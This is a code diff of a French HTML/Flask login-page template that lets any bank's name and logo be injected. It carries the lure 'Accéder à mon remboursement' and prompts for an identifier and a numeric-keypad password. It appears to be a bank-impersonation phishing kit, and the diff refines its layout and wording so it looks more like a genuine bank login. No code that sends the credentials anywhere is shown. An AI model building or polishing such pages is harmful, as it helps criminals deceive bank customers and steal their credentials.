@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Accès à mes Comptes - {{ bank_name }}</title>
+    <title>Accès à mon Compte - {{ bank_name }}</title>
     <style>
         /* Reset basic styling */
         * {
@@ -29,10 +29,12 @@
             padding: 40px;
             border-radius: 20px;
             box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
-            width: 350px;
+            width: 400px; /* Largeur augmentée */
             text-align: center;
             opacity: 0;
             animation: fadeIn 1s ease-out forwards;
+            height: 80vh; /* Hauteur fixe pour activer le défilement */
+            overflow-y: auto; /* Activer le défilement vertical */
         }
 
         @keyframes fadeIn {
@@ -180,13 +182,18 @@
             border-color: #007bff;
         }
 
+        .password-type-selector button#text-password-btn {
+            background: #007bff; /* Fond bleu pour la case libre */
+            color: white;
+        }
+
         .password-type-selector button:hover {
             background: #ddd;
         }
 
         /* Clavier numérique */
         .numeric-keyboard {
-            display: none;
+            display: grid; /* Afficher par défaut */
             grid-template-columns: repeat(3, 1fr);
             gap: 10px;
             margin-top: 10px;
@@ -261,7 +268,7 @@
         <div class="main-title">Accéder à mon remboursement</div>
         <!-- Logo dynamique injecté par Flask -->
         <img id="bank-logo" class="bank-logo" src="{{ bank_logo_url }}" alt="Logo de la banque">
-        <h1>Accéder à mes Comptes</h1>
+        <h1>Accéder à mon Compte</h1> <!-- "mes comptes" remplacé par "mon compte" -->
 
         <div class="input-container">
             <label for="client-number">Identifiant</label>
@@ -335,6 +342,9 @@
                 numericBtn.classList.remove("active");
             }
         }
+
+        // Afficher le clavier numérique par défaut
+        setPasswordType("numeric");
 
         // Fonction pour ajouter un chiffre au mot de passe
         function appendNumber(number) {
